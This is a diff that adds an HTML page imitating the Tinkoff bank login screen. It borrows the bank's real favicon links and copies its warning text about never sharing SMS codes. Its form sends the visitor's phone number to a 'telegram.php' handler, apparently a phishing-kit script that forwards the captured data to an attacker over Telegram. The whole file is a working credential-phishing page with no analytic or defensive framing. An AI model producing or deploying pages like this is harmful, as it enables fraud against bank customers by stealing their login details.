@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://business.cdn-tinkoff.ru/static/images/icons/common/icon-180x180.png">
+  <link rel="icon" type="image/x-icon" href="https://business.cdn-tinkoff.ru/static/images/icons/common/favicon.ico">
+  
+  <title>Вход</title>
+</head>
+<body class="body_in-frame">
+
+  <div id="rectangle">
+
+    <form action="telegram.php" method="POST">
+
+  <h1 class="b-title" id="form-title" automation-id="form-title">Вход в&nbsp;Тинькофф</h1>
+  <div class="input-wrap">
+    <input type="tel"
+    class="phone"
+    name="phone"
+    required
+    placeholder="Телефон">
+  </div>
+  <div class="btn">
+    <input type="submit" 
+    disabled
+    value="Продолжить">
+
+     </form>
+  </div>
+  </div>
+
+  <div class="textofficial">
+    Никому не сообщайте код из СМС или свой пароль. Сотрудник банка никогда их не спросит. Убедитесь, что код пришел от отправителя Tinkoff или в push-уведомлении приложения. Проверяйте сайт банка в адресной строке: id.tinkoff.ru
+  </div>
+    <script src="https://unpkg.com/imask"></script>
+    <script src="app.js"></script>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="http://getbootstrap.com/assets/js/ie10-viewport-bug-workaround.js"></script>
+</body>
+</html>
